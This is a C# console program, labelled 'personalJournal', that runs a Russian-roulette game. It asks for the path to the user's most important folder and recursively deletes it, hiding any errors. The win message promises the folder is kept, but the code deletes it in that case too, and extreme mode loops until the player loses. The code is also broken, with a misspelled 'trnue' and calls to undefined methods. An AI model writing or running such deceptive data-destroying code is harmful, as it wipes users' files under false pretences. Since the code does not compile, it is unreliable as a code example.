using System;

namespace personalJournal
{
    internal class Program
    {
        // store information about user's folder
        private static string directoryPath;
        private static string directoryName;
        private static int directoryFilesCount = 0;

        // creating instance of random number generator
        private static Random revolversChambler = new Random();

        // variables for both game modes
        private static int roundsCount = 1;
        private static int ChoosedChambler;
        private const string inputPrompt = "Pick a number (1 to 6) -> ";



        static void Main(string[] args)
        {
            bool continueGame = true;

            while (continueGame)
            {
                PrintWelcomeMessage();

                // get player's choice to continue
                int playerChoice = GetInRangeNumber(1, 2, "Which difficulty do you want to pick(1 or 2)?: ");
                Console.Clear();

                // get path to player's folder
                directoryPath = GetDirPath();
                // get name of user's directory
                directoryName = new DirectoryInfo(directoryPath).Name;
                // get count of all files in user directory
                directoryFilesCount = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories).Length;

                // launch diffrent game modes depending on user's choice
                if (playerChoice == 1)
                {
                    NormalGameMode();
                }
                else
                {
                    ExtremeGameMode();
                }

                // check if user want to play again. if not, break loop
                continueGame = AskToContinue();
            }

          

            static string GetDirPath()
            {
                string dirPath;
                bool dirExists;
                do
                {
                    Console.Write("Path to your most important folder: ");
                    dirPath = Console.ReadLine();

                    // check if provided path correct
                    dirExists = Directory.Exists(dirPath);

                    if (!dirExists)
                    {
                        Console.WriteLine("\u001b[31mProvided path is incorrect, please type it again.\u001b[0m");
                    }

                } while (!dirExists);

                return dirPath;
            }

            static void DeleteDirectory(string dirPath, string dirName)
            {
                // delete all files in player's directory 
                try
                {
                   Directory.Delete(dirPath, true);
                }
                catch (Exception e)
                {
                    // ignore all execptions
                }
            }

            // normal difficluty game logic
            static void NormalGameMode()
            {
                int losingNumber = 0;
                while (roundsCount <= 3)
                {
                    int choosedChambler = HandleGameRound();

                    // generate a losing number in range 1-6
                    losingNumber = revolversChambler.Next(1, 7);

                    // if user lose, print out message, delete his folder and exit game
                    if(choosedChambler == losingNumber)
                    {
                        HandlePlayerElimination();
                        Console.WriteLine($"P.S bullet was in chambler \u2116{losingNumber}\n\n\n");
                        return;
                    }

                    roundsCount++;
                }

                // printing out a congratulatory message if the player won all 3 rounds
                HandlePlayerSurvival();
                Console.WriteLine($"P.S bullet was in chambler \u2116{losingNumber}");
            }

            static void ExtremeGameMode()
            {
                while (roundsCount <= 3)
                {
                    ChoosedChambler = HandleGameRound();
                    // generate a chambler number that won't be loaded with bullet 
                    int winningNumber = revolversChambler.Next(1, 7);

                    if (ChoosedChambler != winningNumber)
                    {
                        HandlePlayerElimination();
                        Console.WriteLine($"P.S chambler \u2116{winningNumber} was unloaded!\n\n\n");
                        return;
                    }
                }

                HandlePlayerSurvival();
            }

            static void HandlePlayerSurvival()
            {
                Console.Clear();

                Console.WriteLine($"\u001b[32mCongratulations! You survived all three rounds of my game! You can keep your \"{directoryName}\" folder (and your life)!\u001b[0m");
                DeleteDirectory(directoryPath, directoryName);
            }

            static void HandlePlayerElimination()
            {
                Console.Clear();
                Console.WriteLine(
                    $"\u001b[31mUnfortunately, you're dead now. Game will proceed to delete your \"{directoryName}\" folder as you won't need it anyway.\u001b[0m");
                DeleteDirectory(directoryPath, directoryName);
            }

            static int HandleGameRound()
            {
                Console.Clear();
                Console.WriteLine($"\u001b[34m(Round {roundsCount})\u001b[0m");
                int playerInput = GetInRangeNumber(1, 7, inputPrompt);

                return playerInput;
            }

            // find out if player want to play the game again
            static bool AskToContinue()
            {
                bool choice = GetAgreement("Do you want to test your luck and play the game again(y/n)?: ");

                if (choice)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }

          


            // get number from user in specific range
            static int GetInRangeNumber(int lowerBound, int upperBound, string inputPrompt)
            {
                int resultNumber;

                while (trnue)
                {
                    Console.Write(inputPrompt);
                    // handle execptions
                    try
                    {
                        resultNumber = Convert.ToInt32(Console.ReadLine());

                        if (resultNumber >= lowerBound && resultNumber <= upperBound)
                        {
                            return resultNumber;
                        }
                        else
                        {
                            Console.Clear();
                            Console.WriteLine($"Please, type number in range {lowerBound}-{upperBound}");
                        }
                    }
                    catch (FormatException)
                    {
                        Console.Clear();
                        Console.WriteLine($"Please, type a valid number.");
                    }
                    catch (OverflowException)
                    {
                        Console.Clear();
                        Console.WriteLine(
                            $"Number is too large or too small. Please, type number in range {lowerBound}-{upperBound}");
                    }
                }
            }

        }

    }
}